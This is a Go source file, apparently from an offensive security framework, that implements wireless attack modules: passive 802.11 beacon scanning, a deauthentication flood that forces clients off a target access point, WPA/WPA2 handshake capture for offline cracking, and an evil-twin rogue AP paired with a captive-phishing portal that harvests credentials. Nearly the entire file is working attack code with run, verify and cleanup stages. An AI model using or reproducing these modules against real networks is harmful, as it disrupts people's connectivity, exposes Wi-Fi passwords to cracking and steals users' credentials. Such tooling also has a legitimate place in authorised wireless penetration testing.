// Package wlan implements the wireless attack modules: passive 802.11 scanning,
// deauthentication floods, WPA handshake capture and evil-twin AP with a
// captive-phishing portal.
package wlan

import (
	"fmt"
	"net"
	"time"

	"github.com/google/gopacket/layers"

	"github.com/qyvora/toha3ee/internal/attacks"
	"github.com/qyvora/toha3ee/internal/netx/wlan"
	"github.com/qyvora/toha3ee/internal/phish"
	"github.com/qyvora/toha3ee/internal/safety"
)

func init() {
	attacks.Register(&WLANScan{})
	attacks.Register(&WLANDeauth{})
	attacks.Register(&WLANHandshake{})
	attacks.Register(&WLANEvilTwin{})
}

// ---- wlan.scan ----

// WLANScan passively listens for 802.11 beacons to enumerate APs and clients.
type WLANScan struct{}

// Meta implements attacks.Module.
func (*WLANScan) Meta() attacks.ModuleMeta {
	return attacks.ModuleMeta{
		ID:          "wlan.scan",
		Category:    "wireless",
		Risk:        attacks.RiskLow,
		Targets:     []string{"monitor"},
		Requires:    []string{"cap.monitor_iface"},
		Passive:     true,
		Description: "passive 802.11 beacon scan to discover APs, clients and security modes",
		Limitations: "requires a monitor-mode wireless interface; only sees APs within radio range",
	}
}

// scanState tracks the live scanner and the monitor-mode restore hook.
type scanState struct {
	scanner *wlan.Scanner
	restore func() error
}

// Preflight checks for a wireless interface that can enter monitor mode.
func (*WLANScan) Preflight(ctx *attacks.AttackCtx) (*attacks.PreflightReport, error) {
	rep := &attacks.PreflightReport{}
	if name, ok := wlan.DetectWirelessIface(); ok {
		rep.AddOK("monitor_iface", name)
	} else {
		rep.AddBlocked("monitor_iface", "no wireless interface detected")
	}
	return rep, nil
}

// Run listens for beacons in monitor mode and reports AP/client tallies
// until stopped.
func (*WLANScan) Run(ctx *attacks.AttackCtx, opts map[string]string) error {
	ifaceName, _ := wlan.DetectWirelessIface()
	if ifaceName == "" {
		return fmt.Errorf("wlan.scan: no wireless interface found")
	}

	restore, err := wlan.SetMonitorMode(ifaceName)
	if err != nil {
		return fmt.Errorf("wlan.scan: monitor mode: %w", err)
	}

	sc, err := wlan.NewScanner(ifaceName)
	if err != nil {
		_ = restore()
		return fmt.Errorf("wlan.scan: %w", err)
	}
	sc.Start()

	ctx.SetState("wlan.scan", &scanState{scanner: sc, restore: restore})
	ctx.Safety.RegisterCleanup("wlan.scan", "stop scanner and restore interface", func() error {
		sc.Close()
		return restore()
	})

	hb := safety.NewHeartbeat()
	ctx.Heartbeat = hb.Beat
	ctx.Safety.RegisterHeartbeat("wlan.scan", hb)

	ctx.Printf("[*] wlan.scan listening on %s in monitor mode...\n", ifaceName)
	for {
		select {
		case <-ctx.Done:
			return nil
		case <-time.After(2 * time.Second):
			hb.Beat()
			aps := sc.APs()
			clients := sc.Clients()
			ctx.Printf("[wlan.scan] %d AP(s), %d client(s), %d beacon(s)\n", len(aps), len(clients), sc.Beacons.Load())
		}
	}
}

// Verify reports the discovered AP, client and beacon counts.
func (*WLANScan) Verify(ctx *attacks.AttackCtx) (*attacks.Impact, error) {
	v, ok := ctx.GetState("wlan.scan")
	if !ok {
		return nil, fmt.Errorf("wlan.scan not running")
	}
	st := v.(*scanState)
	aps := st.scanner.APs()
	clients := st.scanner.Clients()
	imp := &attacks.Impact{
		Summary: fmt.Sprintf("discovered %d AP(s) and %d client(s)", len(aps), len(clients)),
	}
	imp.Add("aps", fmt.Sprintf("%d", len(aps)))
	imp.Add("clients", fmt.Sprintf("%d", len(clients)))
	imp.Add("beacons", fmt.Sprintf("%d", st.scanner.Beacons.Load()))
	return imp, nil
}

// Cleanup stops the scanner and restores the interface's previous mode.
func (*WLANScan) Cleanup(ctx *attacks.AttackCtx) error {
	ctx.Safety.UnregisterHeartbeat("wlan.scan")
	ctx.Safety.UnregisterCleanup("wlan.scan")
	if v, ok := ctx.GetState("wlan.scan"); ok {
		st := v.(*scanState)
		st.scanner.Close()
		return st.restore()
	}
	return nil
}

// ---- wlan.deauth ----

// WLANDeauth sends deauthentication frames to force clients off an AP.
type WLANDeauth struct{}

// Meta implements attacks.Module.
func (*WLANDeauth) Meta() attacks.ModuleMeta {
	return attacks.ModuleMeta{
		ID:          "wlan.deauth",
		Category:    "wireless",
		Risk:        attacks.RiskHigh,
		Targets:     []string{"ap", "client"},
		Requires:    []string{"cap.monitor_iface"},
		Description: "deauthentication flood to disconnect clients from a target AP",
		Limitations: "clients may reconnect immediately; some APs have 802.11w (protected management frames) which blocks deauth",
	}
}

// deauthState tracks the deauth sender, the restore hook and the frame count.
type deauthState struct {
	sender  *wlan.DeauthSender
	restore func() error
	sent    int
}

// Preflight checks for a monitor-mode interface and notes the BSSID config.
func (*WLANDeauth) Preflight(ctx *attacks.AttackCtx) (*attacks.PreflightReport, error) {
	rep := &attacks.PreflightReport{}
	if name, ok := wlan.DetectWirelessIface(); ok {
		rep.AddOK("monitor_iface", name)
	} else {
		rep.AddBlocked("monitor_iface", "no wireless interface detected")
	}
	rep.AddFixable("target", "set wlan.deauth.bssid to the target AP MAC address")
	return rep, nil
}

// Run floods the target AP (and optionally a specific client) with forged
// deauthentication frames until stopped.
func (*WLANDeauth) Run(ctx *attacks.AttackCtx, opts map[string]string) error {
	ifaceName, _ := wlan.DetectWirelessIface()
	if ifaceName == "" {
		return fmt.Errorf("wlan.deauth: no wireless interface found")
	}

	restore, err := wlan.SetMonitorMode(ifaceName)
	if err != nil {
		return fmt.Errorf("wlan.deauth: monitor mode: %w", err)
	}

	sender, err := wlan.NewDeauthSender(ifaceName)
	if err != nil {
		_ = restore()
		return fmt.Errorf("wlan.deauth: %w", err)
	}

	bssidStr := ctx.Conf.GetDefault("wlan.deauth", "bssid", "")
	if bssidStr == "" {
		sender.Close()
		_ = restore()
		return fmt.Errorf("wlan.deauth: set wlan.deauth.bssid to the target AP MAC")
	}
	bssid, err := net.ParseMAC(bssidStr)
	if err != nil {
		sender.Close()
		_ = restore()
		return fmt.Errorf("wlan.deauth: bad bssid %q: %w", bssidStr, err)
	}

	staStr := ctx.Conf.GetDefault("wlan.deauth", "station", "")
	var sta net.HardwareAddr
	if staStr != "" {
		sta, err = net.ParseMAC(staStr)
		if err != nil {
			sender.Close()
			_ = restore()
			return fmt.Errorf("wlan.deauth: bad station %q: %w", staStr, err)
		}
	}

	count := 0
	for {
		select {
		case <-ctx.Done:
			st := &deauthState{sender: sender, restore: restore, sent: count}
			ctx.SetState("wlan.deauth", st)
			return nil
		default:
		}

		sent, err := sender.Flood(bssid, sta, 5, layers.Dot11ReasonDeauthStLeaving)
		if err != nil {
			ctx.Printf("[!] wlan.deauth: %v\n", err)
			time.Sleep(time.Second)
			continue
		}
		count += sent
		ctx.Printf("[wlan.deauth] sent %d deauth frames to %s (total: %d)\n", sent, bssid, count)
		time.Sleep(500 * time.Millisecond)
	}
}

// Verify reports how many deauthentication frames were sent.
func (*WLANDeauth) Verify(ctx *attacks.AttackCtx) (*attacks.Impact, error) {
	v, ok := ctx.GetState("wlan.deauth")
	if !ok {
		return &attacks.Impact{Summary: "deauth flood was active"}, nil
	}
	st := v.(*deauthState)
	imp := &attacks.Impact{
		Summary: fmt.Sprintf("sent %d deauthentication frames", st.sent),
	}
	imp.Add("frames_sent", fmt.Sprintf("%d", st.sent))
	return imp, nil
}

// Cleanup closes the deauth sender and restores the interface's previous mode.
func (*WLANDeauth) Cleanup(ctx *attacks.AttackCtx) error {
	ctx.Safety.UnregisterHeartbeat("wlan.deauth")
	ctx.Safety.UnregisterCleanup("wlan.deauth")
	if v, ok := ctx.GetState("wlan.deauth"); ok {
		st := v.(*deauthState)
		st.sender.Close()
		return st.restore()
	}
	return nil
}

// ---- wlan.handshake ----

// WLANHandshake captures WPA/WPA2 4-way handshakes for offline cracking.
type WLANHandshake struct{}

// Meta implements attacks.Module.
func (*WLANHandshake) Meta() attacks.ModuleMeta {
	return attacks.ModuleMeta{
		ID:          "wlan.handshake",
		Category:    "wireless",
		Risk:        attacks.RiskHigh,
		Targets:     []string{"ap", "client"},
		Requires:    []string{"cap.monitor_iface"},
		Description: "capture WPA/WPA2 4-way handshake for offline dictionary/brute-force cracking",
		Limitations: "requires a client to connect or roam during capture; PMF-protected clients cannot be deauth'd",
	}
}

// handshakeState tracks the scanner, the deauth sender and the count of
// complete handshakes captured.
type handshakeState struct {
	scanner  *wlan.Scanner
	sender   *wlan.DeauthSender
	restore  func() error
	captured int
}

// Preflight checks for a monitor-mode interface and notes the BSSID config.
func (*WLANHandshake) Preflight(ctx *attacks.AttackCtx) (*attacks.PreflightReport, error) {
	rep := &attacks.PreflightReport{}
	if name, ok := wlan.DetectWirelessIface(); ok {
		rep.AddOK("monitor_iface", name)
	} else {
		rep.AddBlocked("monitor_iface", "no wireless interface detected")
	}
	rep.AddFixable("target", "set wlan.handshake.bssid to the target AP BSSID")
	return rep, nil
}

// Run listens for EAPOL 4-way handshakes (optionally nudging clients with
// deauth frames to force reassociation) until stopped.
func (*WLANHandshake) Run(ctx *attacks.AttackCtx, opts map[string]string) error {
	ifaceName, _ := wlan.DetectWirelessIface()
	if ifaceName == "" {
		return fmt.Errorf("wlan.handshake: no wireless interface found")
	}

	restore, err := wlan.SetMonitorMode(ifaceName)
	if err != nil {
		return fmt.Errorf("wlan.handshake: monitor mode: %w", err)
	}

	sc, err := wlan.NewScanner(ifaceName)
	if err != nil {
		_ = restore()
		return fmt.Errorf("wlan.handshake: %w", err)
	}
	sc.Start()

	sender, err := wlan.NewDeauthSender(ifaceName)
	if err != nil {
		sc.Close()
		_ = restore()
		return fmt.Errorf("wlan.handshake: inject handle: %w", err)
	}

	bssidStr := ctx.Conf.GetDefault("wlan.handshake", "bssid", "")
	var bssid net.HardwareAddr
	if bssidStr != "" {
		bssid, err = net.ParseMAC(bssidStr)
		if err != nil {
			sc.Close()
			sender.Close()
			_ = restore()
			return fmt.Errorf("wlan.handshake: bad bssid %q: %w", bssidStr, err)
		}
	}

	st := &handshakeState{scanner: sc, sender: sender, restore: restore}
	ctx.SetState("wlan.handshake", st)
	ctx.Safety.RegisterCleanup("wlan.handshake", "stop scanner and restore interface", func() error {
		sc.Close()
		sender.Close()
		return restore()
	})

	hb := safety.NewHeartbeat()
	ctx.Heartbeat = hb.Beat
	ctx.Safety.RegisterHeartbeat("wlan.handshake", hb)

	ctx.Printf("[*] wlan.handshake capturing on %s (waiting for EAPOL 4-way handshake)...\n", ifaceName)
	deauthInterval := 0
	for {
		select {
		case <-ctx.Done:
			return nil
		case <-time.After(500 * time.Millisecond):
			hb.Beat()

			for _, hs := range sc.Handshakes() {
				if hs.Complete {
					ctx.Printf("[!] wlan.handshake: COMPLETE 4-way handshake captured for %s -> %s!\n", hs.AP, hs.Client)
					st.captured++
					ctx.Emit("wlan.handshake.captured", "handshake captured", map[string]string{
						"ap":     hs.AP.String(),
						"client": hs.Client.String(),
					})
				}
			}

			deauthInterval++
			if bssid != nil && deauthInterval >= 4 {
				deauthInterval = 0
				sender.Flood(bssid, nil, 3, layers.Dot11ReasonDeauthStLeaving)
				ctx.Printf("[wlan.handshake] deauth broadcast to %s to force reassociation\n", bssid)
			}
		}
	}
}

// Verify reports the number of complete handshakes captured and the observed
// AP/client/EAPOL tallies.
func (*WLANHandshake) Verify(ctx *attacks.AttackCtx) (*attacks.Impact, error) {
	v, ok := ctx.GetState("wlan.handshake")
	if !ok {
		return &attacks.Impact{Summary: "handshake capture was active"}, nil
	}
	st := v.(*handshakeState)
	aps := st.scanner.APs()
	clients := st.scanner.Clients()
	handshakes := st.scanner.Handshakes()
	complete := 0
	for _, h := range handshakes {
		if h.Complete {
			complete++
		}
	}
	imp := &attacks.Impact{
		Summary: fmt.Sprintf("captured %d complete handshake(s); observed %d AP(s), %d client(s)", st.captured, len(aps), len(clients)),
	}
	imp.Add("handshakes_captured", fmt.Sprintf("%d", st.captured))
	imp.Add("handshakes_seen", fmt.Sprintf("%d", complete))
	imp.Add("eapol_frames", fmt.Sprintf("%d", st.scanner.EAPOL.Load()))
	return imp, nil
}

// Cleanup closes the scanner and sender and restores the interface.
func (*WLANHandshake) Cleanup(ctx *attacks.AttackCtx) error {
	ctx.Safety.UnregisterHeartbeat("wlan.handshake")
	ctx.Safety.UnregisterCleanup("wlan.handshake")
	if v, ok := ctx.GetState("wlan.handshake"); ok {
		st := v.(*handshakeState)
		st.scanner.Close()
		st.sender.Close()
		return st.restore()
	}
	return nil
}

// ---- wlan.eviltwin ----

// WLANEvilTwin creates a rogue AP impersonating a target SSID with a
// captive-phishing portal that harvests credentials.
type WLANEvilTwin struct{}

// Meta implements attacks.Module.
func (*WLANEvilTwin) Meta() attacks.ModuleMeta {
	return attacks.ModuleMeta{
		ID:          "wlan.eviltwin",
		Category:    "wireless",
		Risk:        attacks.RiskCritical,
		Targets:     []string{"ap"},
		Requires:    []string{"cap.monitor_iface"},
		Description: "rogue AP impersonating a trusted SSID with a captive-phishing portal for credential harvesting",
		Limitations: "clients must connect to the rogue AP; enterprise WPA-802.1X networks are not supported; detectable by WIDS",
	}
}

// eviltwinState tracks the scanner, the restore hook and the capture count.
type eviltwinState struct {
	scanner  *wlan.Scanner
	restore  func() error
	captured int
}

// Preflight checks for a monitor-mode interface and a known phish template.
func (*WLANEvilTwin) Preflight(ctx *attacks.AttackCtx) (*attacks.PreflightReport, error) {
	rep := &attacks.PreflightReport{}
	if name, ok := wlan.DetectWirelessIface(); ok {
		rep.AddOK("monitor_iface", name)
	} else {
		rep.AddBlocked("monitor_iface", "no wireless interface detected")
	}
	brand := ctx.Conf.GetDefault("wlan.eviltwin", "brand", "captiveportal")
	if !phish.IsKnownTemplate(brand) {
		rep.AddBlocked("brand", fmt.Sprintf("unknown template %q", brand))
	} else {
		rep.AddOK("brand", brand)
	}
	rep.AddFixable("ssid", "set wlan.eviltwin.ssid to the target network name")
	return rep, nil
}

// Run prepares the monitor-mode scanner and the captive-phishing portal for
// the impersonated SSID; AP beacon injection is delegated to an external
// tool (e.g. hostapd-mana) while this module runs.
func (*WLANEvilTwin) Run(ctx *attacks.AttackCtx, opts map[string]string) error {
	ifaceName, _ := wlan.DetectWirelessIface()
	if ifaceName == "" {
		return fmt.Errorf("wlan.eviltwin: no wireless interface found")
	}

	ssid := ctx.Conf.GetDefault("wlan.eviltwin", "ssid", "")
	if ssid == "" {
		return fmt.Errorf("wlan.eviltwin: set wlan.eviltwin.ssid to the target SSID")
	}

	restore, err := wlan.SetMonitorMode(ifaceName)
	if err != nil {
		return fmt.Errorf("wlan.eviltwin: monitor mode: %w", err)
	}

	sc, err := wlan.NewScanner(ifaceName)
	if err != nil {
		_ = restore()
		return fmt.Errorf("wlan.eviltwin: %w", err)
	}
	sc.Start()

	brand := ctx.Conf.GetDefault("wlan.eviltwin", "brand", "captiveportal")
	capPort := ctx.Conf.GetDefault("wlan.eviltwin", "capture_port", "8081")

	st := &eviltwinState{scanner: sc, restore: restore}
	ctx.SetState("wlan.eviltwin", st)
	ctx.Safety.RegisterCleanup("wlan.eviltwin", "stop evil twin and restore interface", func() error {
		sc.Close()
		return restore()
	})

	hb := safety.NewHeartbeat()
	ctx.Heartbeat = hb.Beat
	ctx.Safety.RegisterHeartbeat("wlan.eviltwin", hb)

	ctx.Printf("[*] wlan.eviltwin: SSID=%q brand=%s (captive portal on :%s)\n", ssid, brand, capPort)
	ctx.Printf("[*] NOTE: actual AP beacon injection requires hostapd/wavemon integration (not yet wired)\n")
	ctx.Printf("[*] Use a second tool (e.g. hostapd-mana) to broadcast the AP while this module harvests credentials.\n")

	for {
		select {
		case <-ctx.Done:
			return nil
		case <-time.After(5 * time.Second):
			hb.Beat()
		}
	}
}

// Verify reports harvested credentials and the APs/clients in range.
func (*WLANEvilTwin) Verify(ctx *attacks.AttackCtx) (*attacks.Impact, error) {
	v, ok := ctx.GetState("wlan.eviltwin")
	if !ok {
		return &attacks.Impact{Summary: "evil twin was configured"}, nil
	}
	st := v.(*eviltwinState)
	aps := st.scanner.APs()
	clients := st.scanner.Clients()
	credCount := len(ctx.Store.CredsBySource("phish"))
	imp := &attacks.Impact{
		Summary: fmt.Sprintf("evil twin active; %d credential(s) harvested; %d AP(s), %d client(s) in range", credCount, len(aps), len(clients)),
	}
	imp.Add("phished_creds", fmt.Sprintf("%d", credCount))
	imp.Add("aps_seen", fmt.Sprintf("%d", len(aps)))
	imp.Add("clients_seen", fmt.Sprintf("%d", len(clients)))
	return imp, nil
}

// Cleanup stops the scanner and restores the interface's previous mode.
func (*WLANEvilTwin) Cleanup(ctx *attacks.AttackCtx) error {
	ctx.Safety.UnregisterHeartbeat("wlan.eviltwin")
	ctx.Safety.UnregisterCleanup("wlan.eviltwin")
	if v, ok := ctx.GetState("wlan.eviltwin"); ok {
		st := v.(*eviltwinState)
		st.scanner.Close()
		return st.restore()
	}
	return nil
}
